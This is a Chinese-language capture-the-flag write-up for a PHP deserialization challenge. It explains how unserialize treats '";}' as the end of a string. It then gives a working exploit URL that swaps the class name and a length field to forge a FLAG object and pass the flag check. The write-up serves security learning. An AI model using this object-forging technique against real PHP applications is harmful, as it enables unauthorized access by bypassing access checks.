# WriteUP · Level 18


本题依旧为字符串逃逸题目的前置基础题，序列化和反序列化另一个的规则特性,字符串尾部判定：在进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 ";}" 作为字符串的结尾判定。

在前面的序列化过程我们可以得到这样的字符串：

```PHP
O:4:"Demo":3:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";s:3:"key";s:20:"GET_FLAG";}FAKE_FLAG";}
```

而阅读最后FLAG的条件源码，可知：

```PHP
if ($FLAG instanceof FLAG && $FLAG->key == 'GET_FLAG') {
    include 'flag.php';
    echo $flag;
} else {
    echo "Your serliaze string is ".$serliseStringFLAG . "<br> And Here is ";
    var_dump($FLAG);
}
```

可以看到本题要求我们做一些替换工作让 `key` 值为 `GET_FLAG` ，而在前面的对象创建过程中，我们知道 key 值为 `GET_FLAG";}FAKE_FLAG`，根据我们所知的特性，将 key 值对应的字符数量缩窄只留下 `GET_FLAG`，也就是 8 个字符 —— 将 20 替换为 8即可，接着 题目要求一个新的 FLAG 类，所以还需要将类名标识由 Demo 改为 FLAG。

```PHP
$target = array('Demo', 20);
$change = array('FLAG', 8);
```

构造的exp：

```bash
../index.php?target[]=Demo&target[]=20&change[]=FLAG&change[]=8
```

